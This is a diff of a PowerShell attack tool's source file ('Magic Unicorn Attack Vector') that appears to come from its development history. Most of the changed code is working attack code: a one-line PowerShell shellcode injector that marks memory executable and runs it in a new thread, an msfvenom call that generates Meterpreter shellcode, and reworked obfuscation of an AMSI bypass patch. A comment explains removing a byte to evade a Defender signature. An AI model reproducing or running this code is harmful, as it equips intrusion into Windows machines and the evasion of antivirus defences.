@@ -495,7 +495,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.13 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.15 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -782,7 +782,7 @@ def generate_shellcode(payload, ipaddr, port):
 
         # gen random number for length
         #uri_length=generate_random_number(5,7)
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --platform windows -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --smallest --platform windows -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false --smallest
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
@@ -955,7 +955,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     syswowsplit_2 = generate_random_string(3,4)
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([uint32][int]0,$yyyy,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([int]0,$yyyy,$xxxx,0,0,1-1);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
@@ -968,6 +968,10 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
     if PRINT_DECODED.lower() == "on":
+        if AMSI_BYPASS.lower() == "on":
+            print("# AMSI BYPASS PAYLOAD BELOW")
+            print(bypass_amsi())
+            print("\n# ACTUAL UNICORN PAYLOAD BELOW")
         print(powershell_code)
         print("\n[*] Note that PRINT_DECODED inside unicorn.py was specified and printing the raw output for the PowerShell code. Turn this off to get the full unicorn code.")
         sys.exit()
@@ -1032,7 +1036,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         three = "$" + generate_random_string(5,10)
         four = "$" + generate_random_string(5,10)
         amsi_string = (bypass_amsi()).replace("$kernel32", kernel32).replace("$dll", dll).replace("$amsi", amsi).replace("$scan", scan).replace("$buffer", buffer).replace("$1111", one).replace("$2222", two).replace("$3333", three).replace("$4444", four)
-        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = ("GOATB8, GOAT57, GOAT00, GOAT07, GOAT80, GOATC3").replace("%s", "MOO");%s = [Byte[]](%s).split(",");' % (four, mangle_shellcode, four, four)).replace("GOAT", mangle_shellcode).replace("MOO", "0x")
+        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = ("GOATxB8, GOATx57, GOATxGOATGOAT, GOATxGOAT7, GOATx8GOAT, GOATxC3").replace("%s", "MOO");%s = [Byte[]](%s).split(",");' % (four, mangle_shellcode, four, four)).replace("GOAT", mangle_shellcode).replace("MOO", "0")
         amsi_encoded = base64.b64encode(amsi_string.encode('utf_16_le')).decode('ascii')
         full_attack = '''# AMSI bypass code - run in same process as unicorn second stage\npowershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + amsi_encoded + "')" + '"' + "\n\n# actual unicorn payload\n" + full_attack
 
@@ -1214,7 +1218,48 @@ try:
     ps1path = ""
 
     if len(sys.argv) > 1:
-        if sys.argv[1] == "--help":
+        os.system("clear")
+        gen_unicorn()
+        payload_options = ["powershell","macro","hta","cert","custom","dde","cobalt","general"]
+        help_options = ["-h","--help"]
+
+        if len(sys.argv) > 2:
+            if sys.argv[2] in payload_options:
+                # Show help for specific payload options
+                if sys.argv[2] == "powershell":
+                    ps_help()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "macro":
+                    macro_help()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "hta":
+                    hta_help()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "cert":
+                    cert_help()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "custom":
+                    custom_ps1_help()
+                    custom_shellcode()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "dde":
+                    dde_help()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "cobalt":
+                    cobalt_strike()
+                    gen_usage()
+                    sys.exit()
+                elif sys.argv[2] == "general":
+                    gen_usage()
+                    sys.exit()
+        elif len(sys.argv) <= 2 and sys.argv[1] in help_options:
+            # Show all help menus if none specified
             ps_help()
             macro_help()
             hta_help()
